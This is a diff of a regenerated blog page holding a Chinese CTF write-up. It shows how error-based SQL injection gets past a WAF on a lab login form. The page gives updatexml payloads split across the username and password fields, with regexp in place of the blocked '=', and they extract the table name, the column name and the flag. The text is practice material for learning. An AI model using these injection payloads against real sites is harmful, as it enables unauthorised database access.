@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="Web安全,CTF,">
+  <meta name="keywords" content="CTF,Web安全,">
 
 
 
@@ -79,20 +79,20 @@
 
 
 
-<meta name="description" content="题目地址：http://www.shiyanbar.com/ctf/2011 尝试首先看题目，题目很明显给出了提示，本题是使用报错注入来解决的。 进入网页解题，源码部分给出了查询数据库的命令，为$sql=&amp;quot;select * from users where username=&amp;#39;$username&amp;#39; and password=&amp;#39;$password&amp;#39;&amp;quot">
-<meta name="keywords" content="Web安全,CTF">
+<meta name="description" content="题目地址：http://www.shiyanbar.com/ctf/2011  尝试 首先看题目，题目很明显给出了提示，本题是使用报错注入来解决的。 进入网页解题，源码部分给出了查询数据库的命令，为 $sql=&amp;quot;select * from users where username=&apos;$username&apos; and password=&apos;$password&apos;&amp;quot;; 同时题目是通过POS">
+<meta name="keywords" content="CTF,Web安全">
 <meta property="og:type" content="article">
 <meta property="og:title" content="CTF题目-加了料的报错注入">
 <meta property="og:url" content="http://yoursite.com/2019/07/04/CTF题目-加了料的报错注入/index.html">
 <meta property="og:site_name" content="Chen&#39;s Bolg">
-<meta property="og:description" content="题目地址：http://www.shiyanbar.com/ctf/2011 尝试首先看题目，题目很明显给出了提示，本题是使用报错注入来解决的。 进入网页解题，源码部分给出了查询数据库的命令，为$sql=&amp;quot;select * from users where username=&amp;#39;$username&amp;#39; and password=&amp;#39;$password&amp;#39;&amp;quot">
+<meta property="og:description" content="题目地址：http://www.shiyanbar.com/ctf/2011  尝试 首先看题目，题目很明显给出了提示，本题是使用报错注入来解决的。 进入网页解题，源码部分给出了查询数据库的命令，为 $sql=&amp;quot;select * from users where username=&apos;$username&apos; and password=&apos;$password&apos;&amp;quot;; 同时题目是通过POS">
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="http://yoursite.com/2019/07/04/CTF题目-加了料的报错注入/2.png">
 <meta property="og:image" content="http://yoursite.com/2019/07/04/CTF题目-加了料的报错注入/1.png">
 <meta property="og:updated_time" content="2019-08-29T08:10:09.294Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="CTF题目-加了料的报错注入">
-<meta name="twitter:description" content="题目地址：http://www.shiyanbar.com/ctf/2011 尝试首先看题目，题目很明显给出了提示，本题是使用报错注入来解决的。 进入网页解题，源码部分给出了查询数据库的命令，为$sql=&amp;quot;select * from users where username=&amp;#39;$username&amp;#39; and password=&amp;#39;$password&amp;#39;&amp;quot">
+<meta name="twitter:description" content="题目地址：http://www.shiyanbar.com/ctf/2011  尝试 首先看题目，题目很明显给出了提示，本题是使用报错注入来解决的。 进入网页解题，源码部分给出了查询数据库的命令，为 $sql=&amp;quot;select * from users where username=&apos;$username&apos; and password=&apos;$password&apos;&amp;quot;; 同时题目是通过POS">
 <meta name="twitter:image" content="http://yoursite.com/2019/07/04/CTF题目-加了料的报错注入/2.png">
 
 
@@ -371,7 +371,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  698字
+                  673字
                 </span>
               
 
@@ -409,24 +409,36 @@
 
       
         <p>题目地址：<a href="http://www.shiyanbar.com/ctf/2011" target="_blank" rel="noopener">http://www.shiyanbar.com/ctf/2011</a></p>
-<h2 id="尝试"><a href="#尝试" class="headerlink" title="尝试"></a>尝试</h2><p>首先看题目，题目很明显给出了提示，本题是使用报错注入来解决的。</p>
-<p>进入网页解题，源码部分给出了查询数据库的命令，为<br><code>$sql=&quot;select * from users where username=&#39;$username&#39; and password=&#39;$password&#39;&quot;;</code></p>
+<h2 id="尝试"><a class="markdownIt-Anchor" href="#尝试"></a> 尝试</h2>
+<p>首先看题目，题目很明显给出了提示，本题是使用报错注入来解决的。</p>
+<p>进入网页解题，源码部分给出了查询数据库的命令，为<br>
+<code>$sql=&quot;select * from users where username='$username' and password='$password'&quot;;</code></p>
 <p>同时题目是通过POST的方式来传输账号和密码的，首先在POST报文中尝试提供信息为<code>username=1+&amp;+password=1</code>，发送后网页端返回<code>Login failed</code></p>
-<p>尝试使用<code>username=&#39; or 1=1 %23&amp;password=1</code>进行注入，网页端反馈Sql injection detected，因此可以推断出服务器端对SQL的注入命令进行了筛选，也就是加了WAF</p>
-<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>使用BURP抓取POST包进行fuzz分析，分别对username和password的内容进行测试，测试发现两者屏蔽的值并不相同</p>
-<p>首先对于username，分析结果如下图所示：<br><img src="/2019/07/04/CTF题目-加了料的报错注入/2.png"></p>
+<p>尝试使用<code>username=' or 1=1 %23&amp;password=1</code>进行注入，网页端反馈Sql injection detected，因此可以推断出服务器端对SQL的注入命令进行了筛选，也就是加了WAF</p>
+<h2 id="测试"><a class="markdownIt-Anchor" href="#测试"></a> 测试</h2>
+<p>使用BURP抓取POST包进行fuzz分析，分别对username和password的内容进行测试，测试发现两者屏蔽的值并不相同</p>
+<p>首先对于username，分析结果如下图所示：</p>
+<img src="/2019/07/04/CTF题目-加了料的报错注入/2.png">
 <p>由返回长度可以知道信息，其中302是<code>Login failed</code>，238是<code>Sql injection detected</code>，235是<code>username unknow error</code>对于后两者相当于符号被屏蔽了，前者是可以使用的。因此可以看出在username字段不能使用#、-、=、(、)，但是最终要的是这里能用到exp和updatexml</p>
 <p>对于password，分析结果如下：</p>
 <img src="/2019/07/04/CTF题目-加了料的报错注入/1.png">
 <p>和前面相反，这里并没屏蔽()，因此可以选择在后面添加语句</p>
-<p>构造语句<code>username=&#39; or exp/*&amp;password=*/(~(select * from (select user()) a)) or &#39;</code>发现返回的语句并没有解析user()，而是原样报错返回了</p>
-<p>尝试使用updatexml构造语句<code>username=&#39; or updatexml/*&amp;password=*/(1,concat(0x3a,(select user())),1) or &#39;</code>，可以发现网页返回了用户名<code>web8@localhost</code></p>
-<h2 id="破解"><a href="#破解" class="headerlink" title="破解"></a>破解</h2><p>得到payload就可以开始注入了，首先构造一句话来得到表名字：<br><code>username=&#39; or updatexml/*&amp;password=*/(1,concat(0x3a,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1) or &#39;</code><br>结果发现出现了数据库注入报错，仔细观察发现是在password的内容端添加了一个等号，而前面测试过，等号是被屏蔽的，这时候可以想到使用正则表达式的指令regexp来代替等号，因此构造语句为：<br><code>username=&#39; or updatexml/*&amp;password=*/(1,concat(0x3a,(select group_concat(table_name) from information_schema.tables where table_schema regexp database())),1) or &#39;</code></p>
-<p>网页返回结果为<code>XPATH syntax error: &#39;:ffll44jj,users&#39;</code><br>因此成功得到表名为<code>ffll44jj</code></p>
-<p>接下来尝试获取字段名，同样的方法，构造语句：<br><code>username=&#39; or updatexml/*&amp;password=*/(1,concat(0x3a,(select group_concat(column_name) from information_schema.columns where table_name regexp &#39;ffll44jj&#39;)),1) or &#39;</code></p>
-<p>网页成功返回<code>XPATH syntax error: &#39;:value&#39;</code><br>由此得知flag所在列的名称为value</p>
-<p>再次构造命令来获取列中的值：<br><code>username=&#39; or updatexml/*&amp;password=*/(1,concat(0x3a,(select value from ffll44jj)),1) or &#39;</code></p>
-<p>然后就可以成功得到flag为<code>XPATH syntax error: &#39;:flag{err0r_b4sed_sqli_+_hpf}&#39;</code></p>
+<p>构造语句<code>username=' or exp/*&amp;password=*/(~(select * from (select user()) a)) or '</code>发现返回的语句并没有解析user()，而是原样报错返回了</p>
+<p>尝试使用updatexml构造语句<code>username=' or updatexml/*&amp;password=*/(1,concat(0x3a,(select user())),1) or '</code>，可以发现网页返回了用户名<code>web8@localhost</code></p>
+<h2 id="破解"><a class="markdownIt-Anchor" href="#破解"></a> 破解</h2>
+<p>得到payload就可以开始注入了，首先构造一句话来得到表名字：<br>
+<code>username=' or updatexml/*&amp;password=*/(1,concat(0x3a,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1) or '</code><br>
+结果发现出现了数据库注入报错，仔细观察发现是在password的内容端添加了一个等号，而前面测试过，等号是被屏蔽的，这时候可以想到使用正则表达式的指令regexp来代替等号，因此构造语句为：<br>
+<code>username=' or updatexml/*&amp;password=*/(1,concat(0x3a,(select group_concat(table_name) from information_schema.tables where table_schema regexp database())),1) or '</code></p>
+<p>网页返回结果为<code>XPATH syntax error: ':ffll44jj,users'</code><br>
+因此成功得到表名为<code>ffll44jj</code></p>
+<p>接下来尝试获取字段名，同样的方法，构造语句：<br>
+<code>username=' or updatexml/*&amp;password=*/(1,concat(0x3a,(select group_concat(column_name) from information_schema.columns where table_name regexp 'ffll44jj')),1) or '</code></p>
+<p>网页成功返回<code>XPATH syntax error: ':value'</code><br>
+由此得知flag所在列的名称为value</p>
+<p>再次构造命令来获取列中的值：<br>
+<code>username=' or updatexml/*&amp;password=*/(1,concat(0x3a,(select value from ffll44jj)),1) or '</code></p>
+<p>然后就可以成功得到flag为<code>XPATH syntax error: ':flag{err0r_b4sed_sqli_+_hpf}'</code></p>
 
       
     </div>
@@ -444,9 +456,9 @@
       
         <div class="post-tags">
           
-            <a href="/tags/Web安全/" rel="tag"><i class="fa fa-tag"></i> Web安全</a>
-          
             <a href="/tags/CTF/" rel="tag"><i class="fa fa-tag"></i> CTF</a>
+          
+            <a href="/tags/Web安全/" rel="tag"><i class="fa fa-tag"></i> Web安全</a>
           
         </div>
       
@@ -550,7 +562,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">13</span>
+                  <span class="site-state-item-count">14</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -605,7 +617,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#尝试"><span class="nav-number">1.</span> <span class="nav-text">尝试</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#测试"><span class="nav-number">2.</span> <span class="nav-text">测试</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#破解"><span class="nav-number">3.</span> <span class="nav-text">破解</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#尝试"><span class="nav-number">1.</span> <span class="nav-text"> 尝试</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#测试"><span class="nav-number">2.</span> <span class="nav-text"> 测试</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#破解"><span class="nav-number">3.</span> <span class="nav-text"> 破解</span></a></li></ol></div>
             
 
           </div>
@@ -639,7 +651,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">26.2k</span>
+    <span title="Site words total count">26.4k</span>
   
 </div>
 
